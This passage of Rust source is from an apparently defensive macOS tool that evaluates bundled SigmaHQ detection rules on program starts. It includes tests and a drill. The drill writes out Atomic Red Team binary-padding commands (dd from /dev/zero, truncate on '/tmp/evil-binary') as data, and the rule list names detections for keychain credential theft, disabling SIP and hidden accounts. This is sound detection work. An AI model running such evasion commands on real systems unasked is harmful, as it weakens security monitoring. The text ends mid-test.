//! Published Sigma rules for macOS, evaluated in memory over one program start.
//!
//! The rules are SigmaHQ's, unmodified, in `rules/sigma/` with its NOTICE, and compiled into
//! the program. What Sigma means is the evaluator's to say, `sigma-rust`'s: conditions,
//! modifiers, case folding, what an absent field or `null` means. Nothing here re-implements
//! it; the tests below pin how it behaves on the shipped rules where the specification leaves
//! room. What is ours is small: which Sigma field each part of a program start is, which rules
//! this level can evaluate, and naming the ones it cannot, so none is skipped silently and none
//! is counted among the rules that watch when it does not.
//!
//! Nothing is stored and nothing is printed here.

use serde_json::{Value as Json, json};
use serde_norway::Value;
use std::collections::{BTreeMap, BTreeSet};

/// Where the shipped rules come from, and the commit they were copied at.
pub const SOURCE: &str = "https://github.com/SigmaHQ/sigma";
pub const COMMIT: &str = "d7c9da10c170a6988d68ebdf2c9f7bd8782b7c55";
pub const COMMIT_DATE: &str = "2026-11-10";
pub const LICENCE: &str = "DRL-1.1";
/// The folder they are in, relative to the repository; a rule's `file` is relative to it.
pub const FOLDER: &str = "rules/sigma";

macro_rules! shipped {
    ($($path:literal,)*) => {
        &[$(($path, include_str!(concat!("../rules/sigma/", $path))),)*]
    };
}

/// Every shipped rule: its path under `FOLDER` and its text. A test holds this list to the
/// folder, so a file added there and not here fails it.
pub const SHIPPED: &[(&str, &str)] = shipped![
    "rules-emerging-threats/2025/Malware/Atomic-MacOS-Stealer/file_event_macos_malware_amos_persistence.yml",
    "rules-emerging-threats/2025/Malware/Atomic-MacOS-Stealer/proc_creation_macos_malware_amos_curl_post.yml",
    "rules-emerging-threats/2026/Malware/Axios-NPM-Compromise/file_event_macos_axios_npm_compromise_indicators.yml",
    "rules-emerging-threats/2026/Malware/Axios-NPM-Compromise/proc_creation_macos_axios_npm_compromise_indicators.yml",
    "rules-threat-hunting/macos/file/file_event/file_event_macos_python_path_configuration_files.yml",
    "rules-threat-hunting/macos/process_creation/proc_creation_macos_pbpaste_execution.yml",
    "rules/macos/file_event/file_event_macos_emond_launch_daemon.yml",
    "rules/macos/file_event/file_event_macos_susp_startup_item_created.yml",
    "rules/macos/process_creation/proc_creation_macos_applescript.yml",
    "rules/macos/process_creation/proc_creation_macos_base64_decode.yml",
    "rules/macos/process_creation/proc_creation_macos_binary_padding.yml",
    "rules/macos/process_creation/proc_creation_macos_change_file_time_attr.yml",
    "rules/macos/process_creation/proc_creation_macos_chflags_hidden_flag.yml",
    "rules/macos/process_creation/proc_creation_macos_clear_system_logs.yml",
    "rules/macos/process_creation/proc_creation_macos_clipboard_access_via_osascript.yml",
    "rules/macos/process_creation/proc_creation_macos_create_account.yml",
    "rules/macos/process_creation/proc_creation_macos_create_hidden_account.yml",
    "rules/macos/process_creation/proc_creation_macos_creds_from_keychain.yml",
    "rules/macos/process_creation/proc_creation_macos_csrutil_disable.yml",
    "rules/macos/process_creation/proc_creation_macos_csrutil_status.yml",
    "rules/macos/process_creation/proc_creation_macos_disable_security_tools.yml",
    "rules/macos/process_creation/proc_creation_macos_dscl_add_user_to_admin_group.yml",
    "rules/macos/process_creation/proc_creation_macos_dseditgroup_add_to_admin_group.yml",
    "rules/macos/process_creation/proc_creation_macos_dsenableroot_enable_root_account.yml",
    "rules/macos/process_creation/proc_creation_macos_file_and_directory_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_find_cred_in_files.yml",
    "rules/macos/process_creation/proc_creation_macos_gui_input_capture.yml",
    "rules/macos/process_creation/proc_creation_macos_hdiutil_create.yml",
    "rules/macos/process_creation/proc_creation_macos_hdiutil_mount.yml",
    "rules/macos/process_creation/proc_creation_macos_installer_susp_child_process.yml",
    "rules/macos/process_creation/proc_creation_macos_ioreg_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_jamf_susp_child.yml",
    "rules/macos/process_creation/proc_creation_macos_jamf_usage.yml",
    "rules/macos/process_creation/proc_creation_macos_jxa_in_memory_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_launchctl_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_local_account.yml",
    "rules/macos/process_creation/proc_creation_macos_local_groups.yml",
    "rules/macos/process_creation/proc_creation_macos_network_service_scanning.yml",
    "rules/macos/process_creation/proc_creation_macos_network_sniffing.yml",
    "rules/macos/process_creation/proc_creation_macos_nscurl_usage.yml",
    "rules/macos/process_creation/proc_creation_macos_office_susp_child_processes.yml",
    "rules/macos/process_creation/proc_creation_macos_osacompile_runonly_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_payload_decoded_and_decrypted.yml",
    "rules/macos/process_creation/proc_creation_macos_persistence_via_plistbuddy.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_access_tools_meshagent_arguments.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_access_tools_renamed_meshagent_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_access_tools_teamviewer_incoming_connection.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_system_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_schedule_task_job_cron.yml",
    "rules/macos/process_creation/proc_creation_macos_screencapture.yml",
    "rules/macos/process_creation/proc_creation_macos_security_software_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_space_after_filename.yml",
    "rules/macos/process_creation/proc_creation_macos_split_file_into_pieces.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_browser_child_process.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_execution_macos_script_editor.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_find_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_histfile_operations.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_in_memory_download_and_compile.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_macos_firmware_activity.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_system_network_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_suspicious_applet_behaviour.yml",
    "rules/macos/process_creation/proc_creation_macos_swvers_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_sysadminctl_add_user_to_admin_group.yml",
    "rules/macos/process_creation/proc_creation_macos_sysadminctl_enable_guest_account.yml",
    "rules/macos/process_creation/proc_creation_macos_sysctl_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_system_network_connections_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_system_profiler_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_system_shutdown_reboot.yml",
    "rules/macos/process_creation/proc_creation_macos_tail_base64_decode_from_image.yml",
    "rules/macos/process_creation/proc_creation_macos_tmutil_delete_backup.yml",
    "rules/macos/process_creation/proc_creation_macos_tmutil_disable_backup.yml",
    "rules/macos/process_creation/proc_creation_macos_tmutil_exclude_file_from_backup.yml",
    "rules/macos/process_creation/proc_creation_macos_wizardupdate_malware_infection.yml",
    "rules/macos/process_creation/proc_creation_macos_xattr_gatekeeper_bypass.yml",
    "rules/macos/process_creation/proc_creation_macos_xcsset_malware_infection.yml",
];

/// One program start: the event level's, `crate::events::ProcessStart`, read from
/// `eslogger`'s `exec`. Which Sigma field each of its parts is, and why, is
/// `crate::events::SIGMA_FIELDS`, beside where the line is read.
pub use crate::events::ProcessStart;

/// The kind of event a rule's logsource must name for this level to evaluate it.
pub const CATEGORY: &str = "process_creation";

/// The drill: Atomic Red Team's tests ffe2346c-abd5-4b45-a713-bf5f1ebd573a and
/// e22a9e89-69c7-410f-a473-e6c212cd2292 (T1027.001), as the program starts their commands
/// make. `sh` runs each line; the redirection to the padded file is the shell's, so the
/// program gets only these arguments. Each must raise "Binary Padding - MacOS". The summary
/// runs them through this binary's evaluator, so it says whether the evaluator works here.
pub const DRILL_RULE: &str = "95361ce5-c891-4b0a-87ca-e24607884a96";
pub const DRILL: [(&str, &str, &[&str]); 4] = [
    (
        "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
        "/bin/dd",
        &["dd", "if=/dev/zero", "bs=1", "count=1"],
    ),
    (
        "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
        "/bin/dd",
        &["dd", "if=/dev/random", "bs=1", "count=1"],
    ),
    (
        "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
        "/bin/dd",
        &["dd", "if=/dev/urandom", "bs=1", "count=1"],
    ),
    (
        "e22a9e89-69c7-410f-a473-e6c212cd2292",
        "/usr/bin/truncate",
        &["truncate", "-s", "+1", "/tmp/evil-binary"],
    ),
];

/// A drill start: started by `sh`, as Atomic Red Team's `sh` executor starts it.
pub fn drill_start(image: &str, args: &[&str]) -> ProcessStart {
    ProcessStart {
        executable: image.to_string(),
        args: args.iter().map(|a| a.to_string()).collect(),
        parent_executable: Some("/bin/sh".to_string()),
        ..ProcessStart::default()
    }
}

/// Sigma's names for what a program start gives, and how each is taken from it. A field a rule
/// names that is not here is one this level does not have.
pub use crate::events::SIGMA_FIELDS as FIELDS;

/// How bad, Sigma's levels; their names are OCSF's severity names.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum Level {
    Informational,
    Low,
    Medium,
    High,
    Critical,
}

const LEVELS: [(&str, Level); 5] = [
    ("informational", Level::Informational),
    ("low", Level::Low),
    ("medium", Level::Medium),
    ("high", Level::High),
    ("critical", Level::Critical),
];

impl Level {
    /// Whether a match of a rule of this level raises a finding. Sigma's specification says a
    /// `high` rule "should trigger an internal alert" and that lower levels are rarely an
    /// incident; every lower match is counted only.
    pub fn raises(self) -> bool {
        self >= Level::High
    }

    pub fn as_str(self) -> &'static str {
        LEVELS
            .iter()
            .find(|(_, l)| *l == self)
            .map_or("", |(n, _)| n)
    }
}

/// How mature a rule is, Sigma's statuses.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Status {
    Stable,
    Test,
    Experimental,
    Deprecated,
    Unsupported,
}

const STATUSES: [(&str, Status); 5] = [
    ("stable", Status::Stable),
    ("test", Status::Test),
    ("experimental", Status::Experimental),
    ("deprecated", Status::Deprecated),
    ("unsupported", Status::Unsupported),
];

impl Status {
    /// How sure a finding from a rule of this status is, as OCSF's confidence names it. A
    /// published rule is written from attacks seen elsewhere and was never tuned to this Mac,
    /// where coding agents and build tools start `grep`, `curl`, `osascript` and `dd` all day,
    /// so no status makes a match sure. SigmaHQ calls a rule `stable` once it has been used in
    /// several environments for some time with its false positives listed: medium. `test`,
    /// which is 67 of the 69 macOS rules, says false positives may still be found, and
    /// `experimental` that it is new: low. No published false-positive rate for these rules
    /// on developer Macs was found (`docs/research/event-level.md`). So a finding from a
    /// shipped `test` rule is never urgent: it is shown, and the app does not alert on it.
    pub fn confidence(self) -> &'static str {
        match self {
            Status::Stable => "medium",
            Status::Test | Status::Experimental | Status::Deprecated | Status::Unsupported => "low",
        }
    }

    pub fn as_str(self) -> &'static str {
        STATUSES
            .iter()
            .find(|(_, s)| *s == self)
            .map_or("", |(n, _)| n)
    }
}

/// What a rule says about itself. Text from the rule, returned as data.
#[derive(Debug)]
pub struct Meta {
    pub id: String,
    /// The id of a finding's rule when this rule raises one: `sigma:<id>`.
    pub finding_rule: String,
    pub title: String,
    pub level: Level,
    pub status: Status,
    /// The rule's `author` field. The Detection Rule License asks that a message made from a
    /// match keeps it.
    pub author: Option<String>,
    /// ATT&CK technique ids from its `attack.t…` tags, as `T1027.001`.
    pub techniques: Vec<String>,
    /// The rule's `description`: what it looks for, in its author's words.
    pub description: Option<String>,
}

/// What this level does with a rule.
#[derive(Debug, PartialEq)]
pub enum Placement {
    /// Every part of the rule can match a program start.
    Evaluated,
    /// Evaluated, but these alternatives of its selections never match here, for a field this
    /// level does not have; the rest of the rule can.
    InPart(Vec<Branch>),
    NotEvaluated(Reason),
}

/// One alternative of a selection that never matches at this level.
#[derive(Debug, PartialEq)]
pub struct Branch {
    pub selection: String,
    /// The fields it needs that a program start does not give.
    pub fields: Vec<String>,
}

/// Why a rule is not evaluated. The codes are a closed vocabulary.
#[derive(Debug, PartialEq)]
pub enum Reason {
    /// It is about another kind of event, named by its logsource category: `file_event` rules
    /// need file events, which this level does not collect.
    NeedsEvents(String),
    /// A selection it cannot do without needs fields a program start does not give.
    NeedsFields(Vec<String>),
    /// It searches the whole message for keywords, and this level has fields, not messages.
    KeywordSearch,
    /// It could not be read, with what the parser said.
    NotParsed(String),
}

impl Reason {
    pub fn code(&self) -> &'static str {
        match self {
            Reason::NeedsEvents(_) => "needs_events",
            Reason::NeedsFields(_) => "needs_fields",
            Reason::KeywordSearch => "keyword_search",
            Reason::NotParsed(_) => "not_parsed",
        }
    }
}

/// One shipped rule, read once.
pub struct Loaded {
    /// Its path under `FOLDER`.
    pub file: &'static str,
    /// `None` only when it could not be parsed.
    pub meta: Option<Meta>,
    pub placement: Placement,
    rule: Option<sigma_rust::Rule>,
}

/// A rule an event matched.
pub struct Match<'a> {
    pub file: &'static str,
    pub meta: &'a Meta,
}

impl Match<'_> {
    /// What a message made from this match carries, the rule's authors included as the
    /// Detection Rule License asks.
    pub fn json(&self) -> Json {
        let m = self.meta;
        json!({
            "file": self.file,
            "id_text": crate::status::text(&m.id),
            "title_text": crate::status::text(&m.title),
            "level": m.level.as_str(),
            "status": m.status.as_str(),
            "techniques": m.techniques,
            "author_text": m.author.as_deref().map(crate::status::text),
        })
    }
}

/// How the rule of a finding a published rule raised begins: `sigma:<the rule's id>`.
pub const FINDING_PREFIX: &str = "sigma:";

pub struct Rules {
    pub rules: Vec<Loaded>,
}

static SHIPPED_RULES: std::sync::OnceLock<Rules> = std::sync::OnceLock::new();

impl Rules {
    /// Every shipped rule, parsed once per process, not at each reading: the watcher reads
    /// program starts every thirty seconds for as long as it runs.
    pub fn shipped() -> &'static Rules {
        SHIPPED_RULES.get_or_init(|| Rules::load(SHIPPED))
    }

    /// A rule by its id, among those that could be read.
    pub fn by_id(&self, id: &str) -> Option<&Loaded> {
        self.rules
            .iter()
            .find(|l| l.meta.as_ref().is_some_and(|m| m.id == id))
    }

    pub fn load(files: &[(&'static str, &'static str)]) -> Rules {
        Rules {
            rules: files.iter().map(|(file, text)| load(file, text)).collect(),
        }
    }

    /// The rules this program start matches, in the order they are shipped. Only rules that
    /// are evaluated, wholly or in part, are asked.
    pub fn evaluate(&self, start: &ProcessStart) -> Vec<Match<'_>> {
        let mut event = sigma_rust::Event::new();
        for (name, take) in FIELDS {
            // A field the start does not give stays absent, and an absent field matches
            // nothing.
            if let Some(value) = take(start) {
                event.insert(name, value);
            }
        }
        self.rules
            .iter()
            .filter(|l| !matches!(l.placement, Placement::NotEvaluated(_)))
            .filter_map(|l| match (&l.rule, &l.meta) {
                (Some(rule), Some(meta)) if rule.is_match(&event) => {
                    Some(Match { file: l.file, meta })
                }
                _ => None,
            })
            .collect()
    }

    /// The summary of `soc rules --json`: how many are shipped, evaluated, evaluated in part
    /// and not evaluated, with the rules behind each number.
    pub fn summary_json(&self) -> Json {
        let named = |l: &Loaded| {
            let mut v = json!({
                "file": l.file,
                "id_text": l.meta.as_ref().map(|m| crate::status::text(&m.id)),
                "title_text": l.meta.as_ref().map(|m| crate::status::text(&m.title)),
                "level": l.meta.as_ref().map(|m| m.level.as_str()),
                "status": l.meta.as_ref().map(|m| m.status.as_str()),
            });
            match &l.placement {
                Placement::Evaluated => {}
                Placement::InPart(branches) => {
                    v["never_matches"] = branches
                        .iter()
                        .map(|b| {
                            json!({
                                "selection_text": crate::status::text(&b.selection),
                                "fields_text": texts(&b.fields),
                            })
                        })
                        .collect();
                }
                Placement::NotEvaluated(reason) => {
                    v["reason"] = json!(reason.code());
                    match reason {
                        Reason::NeedsEvents(c) => v["events_text"] = crate::status::text(c),
                        Reason::NeedsFields(f) => v["fields_text"] = texts(f),
                        Reason::KeywordSearch => {}
                        Reason::NotParsed(said) => v["said_text"] = crate::status::text(said),
                    }
                }
            }
            v
        };
        let (evaluated, in_part, not_evaluated) = self.groups();
        json!({
            "source": {
                "url": SOURCE,
                "commit": COMMIT,
                "commit_date": COMMIT_DATE,
                "licence": LICENCE,
                "folder": FOLDER,
            },
            "events": CATEGORY,
            "fields": FIELDS.iter().map(|(n, _)| *n).collect::<Vec<_>>(),
            "totals": {
                "shipped": self.rules.len(),
                "evaluated": evaluated.len(),
                "in_part": in_part.len(),
                "not_evaluated": not_evaluated.len(),
            },
            "evaluated": evaluated.into_iter().map(named).collect::<Vec<_>>(),
            "in_part": in_part.into_iter().map(named).collect::<Vec<_>>(),
            "not_evaluated": not_evaluated.into_iter().map(named).collect::<Vec<_>>(),
            "drill": DRILL.iter().map(|(test, image, args)| {
                let matches = self.evaluate(&drill_start(image, args));
                json!({
                    "atomic_test": test,
                    "image": image,
                    "arguments": args,
                    "must_raise": DRILL_RULE,
                    "raised": matches.iter().any(|m| m.meta.id == DRILL_RULE),
                    "matches": matches.iter().map(Match::json).collect::<Vec<_>>(),
                })
            }).collect::<Vec<_>>(),
        })
    }

    /// How many drill starts raise the rule they must.
    fn drill_raised(&self) -> usize {
        DRILL
            .iter()
            .filter(|(_, image, args)| {
                let matches = self.evaluate(&drill_start(image, args));
                matches.iter().any(|m| m.meta.id == DRILL_RULE)
            })
            .count()
    }

    /// The same summary for a person, a line each, with how many times each rule matched in
    /// the last day where the store says.
    pub fn summary_lines(&self, last_day: Option<&BTreeMap<String, i64>>) -> Vec<String> {
        let (evaluated, in_part, not_evaluated) = self.groups();
        let row = |l: &Loaded| match &l.meta {
            Some(m) => {
                let n = last_day.and_then(|d| d.get(&m.id)).copied().unwrap_or(0);
                let matched = if n > 0 {
                    format!(" · matched {} in the last day", times(n))
                } else {
                    String::new()
                };
                format!("  {:<13} {}{matched}", m.level.as_str(), m.title)
            }
            None => format!("  {:<13} {}", "?", l.file),
        };
        let mut lines = vec![
            format!(
                "Sigma rules for macOS: {} shipped, from SigmaHQ at {} of {}.",
                self.rules.len(),
                &COMMIT[..12],
                COMMIT_DATE
            ),
            format!("Evaluated on every program start: {}", evaluated.len()),
        ];
        lines.extend(evaluated.into_iter().map(row));
        lines.push(format!(
            "Evaluated in part, some alternatives never match here: {}",
            in_part.len()
        ));
        for l in in_part {
            lines.push(row(l));
            if let Placement::InPart(branches) = &l.placement {
                for b in branches {
                    lines.push(format!(
                        "      {} needs {}, which a program start does not give",
                        b.selection,
                        b.fields.join(", ")
                    ));
                }
            }
        }
        lines.push(format!("Not evaluated: {}", not_evaluated.len()));
        for l in not_evaluated {
            lines.push(row(l));
            if let Placement::NotEvaluated(reason) = &l.placement {
                lines.push(format!(
                    "      {}",
                    match reason {
                        Reason::NeedsEvents(c) => format!("needs {c} events"),
                        Reason::NeedsFields(f) => format!(
                            "needs {}, which a program start does not give",
                            f.join(", ")
                        ),
                        Reason::KeywordSearch => "searches whole messages for keywords".into(),
                        Reason::NotParsed(said) => format!("could not be read: {said}"),
                    }
                ));
            }
        }
        lines.push(format!(
            "Drill, Atomic Red Team T1027.001: {} of {} program starts raise {}.",
            self.drill_raised(),
            DRILL.len(),
            self.rules
                .iter()
                .filter_map(|l| l.meta.as_ref())
                .find(|m| m.id == DRILL_RULE)
                .map_or(DRILL_RULE, |m| m.title.as_str())
        ));
        lines
    }

    /// The rules split by placement: evaluated, in part, not evaluated, each from the most
    /// severe down, in the order they are shipped within a level.
    pub fn groups(&self) -> (Vec<&Loaded>, Vec<&Loaded>, Vec<&Loaded>) {
        let mut all: Vec<&Loaded> = self.rules.iter().collect();
        all.sort_by_key(|l| std::cmp::Reverse(l.meta.as_ref().map(|m| m.level)));
        let mut groups = (Vec::new(), Vec::new(), Vec::new());
        for l in all {
            match l.placement {
                Placement::Evaluated => groups.0.push(l),
                Placement::InPart(_) => groups.1.push(l),
                Placement::NotEvaluated(_) => groups.2.push(l),
            }
        }
        groups
    }
}

/// How many times, as a number with its thousands separated.
pub fn times(n: i64) -> String {
    crate::view::counted(n, "time", "times")
}

fn texts(items: &[String]) -> Json {
    items.iter().map(|s| crate::status::text(s)).collect()
}

/// Reads one rule. The YAML is parsed once; the evaluator builds its rule from it, and the
/// level, status and shape of the detection, which the evaluator keeps to itself, are read
/// from it to place the rule.
fn load(file: &'static str, text: &str) -> Loaded {
    let not_parsed = |said: String| Loaded {
        file,
        meta: None,
        placement: Placement::NotEvaluated(Reason::NotParsed(said)),
        rule: None,
    };
    let yaml: Value = match serde_norway::from_str(text) {
        Ok(v) => v,
        Err(e) => return not_parsed(e.to_string()),
    };
    let rule: sigma_rust::Rule = match serde_norway::from_value(yaml.clone()) {
        Ok(rule) => rule,
        Err(e) => return not_parsed(e.to_string()),
    };
    let meta = match meta(&rule, &yaml) {
        Ok(m) => m,
        Err(said) => return not_parsed(said),
    };
    Loaded {
        file,
        meta: Some(meta),
        placement: place(&yaml),
        rule: Some(rule),
    }
}

/// A rule is evaluated only with an id and a level, so that a match can be named and weighed.
fn meta(rule: &sigma_rust::Rule, yaml: &Value) -> Result<Meta, String> {
    // The evaluator refuses a level or status that is not Sigma's; it allows none.
    fn one_of<T: Copy>(table: &[(&str, T)], key: &str, yaml: &Value) -> Result<T, String> {
        let value = yaml[key].as_str();
        table
            .iter()
            .find(|(n, _)| Some(*n) == value)
            .map(|(_, v)| *v)
            .ok_or(format!("the rule has no {key}"))
    }
    let id = rule.id.clone().ok_or("the rule has no id")?;
    Ok(Meta {
        finding_rule: format!("{FINDING_PREFIX}{id}"),
        id,
        title: rule.title.clone(),
        level: one_of(&LEVELS, "level", yaml)?,
        status: one_of(&STATUSES, "status", yaml)?,
        author: rule.author.clone(),
        techniques: rule
            .tags
            .iter()
            .flatten()
            .filter_map(|t| t.strip_prefix("attack.t"))
            .map(|t| format!("T{t}"))
            .collect(),
        description: yaml["description"].as_str().map(str::to_string),
    })
}

/// Places a parsed rule. A selection is a map of fields, all of which must match, or a list of
/// such maps, one of which must. A map that names a field a program start does not give can
/// never match: the evaluator takes an absent field as not matching. If every map of some
/// selection is like that, the rule is not evaluated, whatever its condition says, since
/// reading the condition is the evaluator's. If only some maps are, the rest of each selection
/// still matches as the rule means, so the rule is evaluated in part and those maps are named.
fn place(yaml: &Value) -> Placement {
    let category = yaml["logsource"]["category"].as_str().unwrap_or_default();
    if category != CATEGORY {
        return Placement::NotEvaluated(Reason::NeedsEvents(category.to_string()));
    }
    let given = |f: &&str| FIELDS.iter().any(|(n, _)| n == f);
    let mut dead = Vec::new();
    let mut lacking_all = BTreeSet::new();
    let mut a_selection_is_dead = false;
    for (name, selection) in yaml["detection"].as_mapping().into_iter().flatten() {
        let Some(name) = name.as_str().filter(|n| *n != "condition") else {
            continue;
        };
        let maps: Vec<&serde_norway::Mapping> = match selection {
            Value::Mapping(m) => vec![m],
            Value::Sequence(items) if items.iter().all(Value::is_mapping) => {
                items.iter().filter_map(Value::as_mapping).collect()
            }
            _ => return Placement::NotEvaluated(Reason::KeywordSearch),
        };
        let mut alive = false;
        for map in maps {
            let lacking: BTreeSet<&str> = map
                .keys()
                .filter_map(Value::as_str)
                .filter_map(|k| k.split('|').next())
                .filter(|f| !given(f))
                .collect();
            if lacking.is_empty() {
                alive = true;
            } else {
                lacking_all.extend(lacking.iter().map(|f| f.to_string()));
                dead.push(Branch {
                    selection: name.to_string(),
                    fields: lacking.into_iter().map(str::to_string).collect(),
                });
            }
        }
        a_selection_is_dead |= !alive;
    }
    if a_selection_is_dead {
        Placement::NotEvaluated(Reason::NeedsFields(lacking_all.into_iter().collect()))
    } else if dead.is_empty() {
        Placement::Evaluated
    } else {
        Placement::InPart(dead)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn start(image: &str, args: &[&str], parent: &str) -> ProcessStart {
        ProcessStart {
            executable: image.to_string(),
            args: args.iter().map(|a| a.to_string()).collect(),
            parent_executable: Some(parent.to_string()),
            ..ProcessStart::default()
        }
    }

    fn fired(rules: &Rules, s: &ProcessStart) -> Vec<String> {
        rules
            .evaluate(s)
            .iter()
            .map(|m| m.meta.id.clone())
            .collect()
    }

    fn fires(rules: &Rules, id: &str, s: &ProcessStart) -> bool {
        fired(rules, s).iter().any(|f| f == id)
    }

    fn by_id<'a>(rules: &'a Rules, id: &str) -> &'a Loaded {
        rules
            .rules
            .iter()
            .find(|l| l.meta.as_ref().is_some_and(|m| m.id == id))
            .unwrap_or_else(|| panic!("{id} is not shipped"))
    }

    const BINARY_PADDING: &str = "95361ce5-c891-4b0a-87ca-e24607884a96";
    const RENAMED_MESHAGENT: &str = "bd3b5eaa-439d-4a42-8f35-a49f5c8a2582";
    const BROWSER_CHILD: &str = "0250638a-2b28-4541-86fc-ea4c558fa0c6";
    const HIDDEN_USER: &str = "b22a5b36-2431-493a-8be1-0bae56c28ef3";
    const NETWORK_SCANNING: &str = "84bae5d4-b518-4ae0-b331-6d4afd34d00f";
    const FILE_DISCOVERY: &str = "089dbdf6-b960-4bcc-90e3-ffc3480c20f6";

    /// No false calm: every file in the folder is shipped, every shipped rule is placed as
    /// evaluated, evaluated in part or not evaluated with a reason, and the numbers add up to
    /// the files. A rule added to the folder and not to `SHIPPED` fails here, and so does one
    /// that changes the numbers, until someone looks at where it went.
    #[test]
    fn every_shipped_rule_is_accounted_for() {
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(FOLDER);
        let mut on_disk = BTreeSet::new();
        let mut dirs = vec![root.clone()];
        while let Some(dir) = dirs.pop() {
            for entry in std::fs::read_dir(&dir).unwrap() {
                let path = entry.unwrap().path();
                if path.is_dir() {
                    dirs.push(path);
                } else if path.extension().is_some_and(|e| e == "yml") {
                    let rel = path.strip_prefix(&root).unwrap();
                    on_disk.insert(rel.to_str().unwrap().to_string());
                }
            }
        }
        let shipped: BTreeSet<String> = SHIPPED.iter().map(|(p, _)| p.to_string()).collect();
        assert_eq!(on_disk, shipped, "the folder and the shipped list differ");
        for (path, text) in SHIPPED {
            let on_disk = std::fs::read_to_string(root.join(path)).unwrap();
            assert_eq!(&on_disk, text, "{path} is compiled in as it is on disk");
            let yaml: Value = serde_norway::from_str(text).unwrap();
            assert_eq!(
                yaml["logsource"]["product"].as_str(),
                Some("macos"),
                "{path}"
            );
        }

        let rules = Rules::shipped();
        let s = rules.summary_json();
        let t = &s["totals"];
        assert_eq!(t["shipped"], SHIPPED.len());
        assert_eq!(t["shipped"], 75);
        assert_eq!(
            (t["evaluated"].clone(), t["in_part"].clone()),
            (json!(69), json!(1))
        );
        assert_eq!(t["not_evaluated"], 5);
        let ids = |key: &str| -> Vec<String> {
            s[key]
                .as_array()
                .unwrap()
                .iter()
                .map(|r| r["id_text"].as_str().unwrap().to_string())
                .collect()
        };
        assert_eq!(ids("evaluated").len(), 69);
        assert_eq!(ids("in_part"), [RENAMED_MESHAGENT]);
        let mut not = ids("not_evaluated");
        not.sort();
        assert_eq!(
            not,
            [
                "23c43900-e732-45a4-8354-63e4a6c187ce",
                "2db0458c-05c9-4069-a26f-77becd9c8c13",
                "4f394635-13ef-4599-b677-3353e0f84f55",
                "dfe8b941-4e54-4242-b674-6b613d521962",
                "e710a880-1f18-4417-b6a0-b5afdf7e3023",
            ]
        );
        for r in s["not_evaluated"].as_array().unwrap() {
            assert_eq!(r["reason"], "needs_events");
            assert_eq!(r["events_text"], "file_event");
        }
    }

    /// The Detection Rule License: the shipped rules carry the URI of the rule set and of the
    /// licence, and the commit they were copied at is the one the program reports.
    #[test]
    fn the_notice_names_the_source_the_commit_and_the_licence() {
        let notice = include_str!("../rules/sigma/NOTICE");
        assert!(notice.contains(SOURCE));
        assert!(notice.contains(COMMIT));
        assert!(notice.contains("https://github.com/SigmaHQ/Detection-Rule-License"));
        assert!(notice.contains("Detection Rule License (DRL) 1.1"));
    }

    /// The drill. Atomic Red Team's tests ffe2346c-abd5-4b45-a713-bf5f1ebd573a and
    /// e22a9e89-69c7-410f-a473-e6c212cd2292 (T1027.001), as `DRILL` writes their commands,
    /// each raise "Binary Padding - MacOS", and the summary says so; copying a file with `dd`
    /// and an ordinary `truncate` do not. A match carries what a finding will need, the rule's
    /// authors included.
    #[test]
    fn the_binary_padding_drill_fires_and_its_near_misses_do_not() {
        let rules = Rules::shipped();
        assert_eq!(DRILL_RULE, BINARY_PADDING);
        let tests: BTreeSet<&str> = DRILL.iter().map(|(t, _, _)| *t).collect();
        assert_eq!(
            tests,
            BTreeSet::from([
                "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
                "e22a9e89-69c7-410f-a473-e6c212cd2292"
            ])
        );
        for (_, image, args) in DRILL {
            assert!(
                fires(rules, BINARY_PADDING, &drill_start(image, args)),
                "{args:?}"
            );
        }
        let s = rules.summary_json();
        for d in s["drill"].as_array().unwrap() {
            assert_eq!(d["raised"], true, "{d}");
        }
        assert!(
            rules
                .summary_lines(None)
                .iter()
                .any(|l| l == "Drill, Atomic Red Team T1027.001: 4 of 4 program starts raise Binary Padding - MacOS.")
        );
        let truncate = drill_start("/usr/bin/truncate", DRILL[3].2);
        assert_eq!(
            s["drill"][3]["matches"],
            json!([{
                "file": "rules/macos/process_creation/proc_creation_macos_binary_padding.yml",
                "id_text": BINARY_PADDING,
                "title_text": "Binary Padding - MacOS",
                "level": "high",
                "status": "test",
                "techniques": ["T1027.001"],
                "author_text": "Igor Fits, Mikhail Larin, oscd.community",
            }])
        );

        let copy = start("/bin/dd", &["dd", "if=a", "of=b"], "/bin/zsh");
        assert!(!fires(rules, BINARY_PADDING, &copy));
        let cut = start(
            "/usr/bin/truncate",
            &["truncate", "-s", "0", "f"],
            "/bin/zsh",
        );
        assert!(!fires(rules, BINARY_PADDING, &cut));

        let m = rules.evaluate(&truncate);
        let m = m.iter().find(|m| m.meta.id == BINARY_PADDING).unwrap();
        assert_eq!(m.meta.title, "Binary Padding - MacOS");
        assert_eq!(m.meta.level, Level::High);
        assert_eq!(m.meta.status, Status::Test);
        assert_eq!(m.meta.techniques, ["T1027.001"]);
        assert_eq!(
            m.meta.author.as_deref(),
